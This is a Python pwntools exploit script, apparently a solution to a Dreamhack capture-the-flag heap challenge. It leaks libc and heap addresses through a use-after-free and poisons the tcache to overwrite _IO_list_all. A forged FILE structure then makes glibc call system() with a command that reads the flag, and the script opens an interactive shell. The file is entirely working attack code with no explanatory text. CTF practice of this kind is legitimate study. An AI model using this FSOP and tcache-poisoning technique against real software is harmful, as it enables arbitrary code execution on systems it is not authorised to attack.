#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.log_level = args.LOG or "info"

ROOT = Path(__file__).resolve().parent
EXE = ROOT / "prob.patched"
if args.HOSTLIBC:
    EXE = ROOT / "deploy" / "prob"
    LIBC = Path("/usr/lib/x86_64-linux-gnu/libc.so.6")
    UNSORTED_LEAK_OFF = 0x203B20
elif args.V3_0:
    LIBC = ROOT / "libc-candidates" / "3.0" / "lib" / "x86_64-linux-gnu" / "libc.so.6"
    UNSORTED_LEAK_OFF = 0x219CE0
else:
    LIBC = ROOT / "libc-ubuntu22" / "libc.so.6"
    UNSORTED_LEAK_OFF = 0x21ACE0

elf = ELF(str(EXE), checksec=False)
libc = ELF(str(LIBC), checksec=False)

HOST = "host3.dreamhack.games"
PORT = 20427


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.LOCALNET:
        return remote("127.0.0.1", 18080)
    if args.DOCKER:
        return process(["docker", "run", "-i", "--rm", "kidheap-local", "./prob"])
    return process([str(EXE)], cwd=str(ROOT))


io = start()


def menu(choice):
    io.sendlineafter(b"> ", str(choice).encode())


def create(idx, name_size, name=b"", content=b""):
    menu(1)
    io.sendlineafter(b"idx > ", str(idx).encode())
    io.sendlineafter(b"name size > ", str(name_size).encode())
    io.sendafter(b"name > ", name.ljust(name_size, b"\x00"))
    io.sendafter(b"content > ", content.ljust(0x100, b"\x00"))


def delete(idx):
    menu(2)
    io.sendlineafter(b"idx > ", str(idx).encode())


def edit(idx, name, content):
    menu(3)
    io.sendlineafter(b"idx > ", str(idx).encode())
    io.sendafter(b"name > ", name)
    io.sendafter(b"content > ", content)


def show(idx):
    menu(4)
    io.sendlineafter(b"idx > ", str(idx).encode())
    io.recvuntil(b"name : ")
    name = io.recvuntil(b"\ncontent : ", drop=True)
    content = io.recvuntil(b"\n1. create note", drop=True)
    return name, content


def u64le(data):
    return u64(data[:8].ljust(8, b"\x00"))


def protect(pos, ptr):
    return (pos >> 12) ^ ptr


# Fill the 0x110 tcache with content chunks, then place note 7's content in unsorted.
for i in range(8):
    create(i, 0x18, b"N" + bytes([0x41 + i]), b"C" + bytes([0x41 + i]))

for i in range(8):
    delete(i)

# Toggle deleted flag back without a second free, then leak the stale unsorted content.
delete(7)
name_leak, libc_leak_raw = show(7)
libc_leak = u64le(libc_leak_raw)
libc.address = libc_leak - UNSORTED_LEAK_OFF
log.info("libc leak: %#x", libc_leak)
log.info("libc base: %#x", libc.address)

# Leak a safe-linking key from a freed tcache chunk. Any singly freed name/content
# chunk whose fd is NULL prints as chunk_addr >> 12.
delete(0)
heap_key_raw, _ = show(0)
heap_key = u64le(heap_key_raw)
heap_base = heap_key << 12
log.info("heap key: %#x", heap_key)
log.info("heap base page: %#x", heap_base)

# The allocation sequence is fixed:
#   content0 = heap_page + 0x2d0, and each note advances content by 0x160.
# Avoid relying on %s leaks of encoded fd values, which can truncate on NUL.
content4 = heap_base + 0x850
content5 = heap_base + 0x9B0
content6 = heap_base + 0xB10

fake_file = content6
wide_data = content5
wide_vtable = wide_data + 0x80
log.info("content4: %#x", content4)
log.info("fake FILE: %#x", fake_file)
log.info("wide_data: %#x", wide_data)

fake_file_blob = flat(
    {
        0x00: b" sh -c 'echo PWNED'\x00" if args.ECHO else b" sh -c 'cat flag /f* 2>&1'\x00",
        0x20: p64(0),
        0x28: p64(1),
        0x88: p64(wide_data + 0xf0),
        0xA0: p64(wide_data),
        0xD8: p64(libc.sym["_IO_wfile_jumps"]),
    },
    filler=b"\x00",
    length=0x100,
)

fake_wide_blob = flat(
    {
        0x18: p64(0),
        0x30: p64(0),
        0xE0: p64(wide_vtable),
        0xE8: p64(libc.sym["system"]),
    },
    filler=b"\x00",
    length=0x100,
)

# Allocate content6 as fake FILE and content5 as fake wide_data.
create(8, 0x100, fake_wide_blob, fake_file_blob)

# Poison current 0x110 tcache head (content4) so the second 0x110 allocation
# in the next create returns _IO_list_all.
delete(4)
edit(4, b"A" * 0x18, p64(protect(content4, libc.sym["_IO_list_all"])).ljust(0x100, b"\x00"))

create(9, 0x100, p64(fake_file), b"B")

menu(5)
if args.RECVALL:
    data = io.recvall(timeout=5)
    print(data)
else:
    io.interactive()
